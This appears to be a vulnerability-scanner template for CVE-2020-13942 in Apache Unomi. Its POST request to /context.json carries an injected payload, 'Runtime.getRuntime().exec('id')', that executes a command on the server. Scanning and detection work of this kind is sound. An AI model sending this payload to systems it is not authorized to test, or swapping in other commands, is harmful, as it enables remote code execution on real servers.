id: yaml-poc-apache-unomi-other-CVE-2020-13942
info:
  name: Yaml Poc Apache Unomi Other Cve 2020 13942
  author: jiapeng.han
  severity: critical
  description: 'Converted from xpoc: yaml-poc-apache-unomi-other-CVE-2020-13942'
  tags: apache,cve
  classification:
    cve-id: CVE-2020-13942
  reference:
  - http://unomi.apache.org./security/cve-2020-13942.txt
  - http://www.openwall.com/lists/oss-security/2020/11/24/5
  - https://advisory.checkmarx.net/advisory/CX-2020-4284
  - https://lists.apache.org/thread.html/r08a4057ff7196b8880117edaa4b6207cbd36ed692d8dd1f5a56b4d0f%40%3Cannounce.apache.org%3E
  - https://lists.apache.org/thread.html/r08a4057ff7196b8880117edaa4b6207cbd36ed692d8dd1f5a56b4d0f@%3Cannounce.apache.org%3E
http:
- method: POST
  path:
  - /context.json
  body: "{\n        \"filters\": [\n          {\n            \"id\": \"{{rStr0}}\"\
    ,\n            \"filters\": [\n              {\n                \"condition\"\
    : {\n                  \"parameterValues\": {\n                    \"{{rStr0}}\"\
    : \"script::Runtime.getRuntime().exec('id')\"\n                  },\n        \
    \          \"type\": \"profilePropertyCondition\"\n                }\n       \
    \       }\n            ]\n          }\n        ],\n        \"sessionId\": \"{{rStr0}}\"\
    \n      }\n"
  headers:
    Content-Type: application/json
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
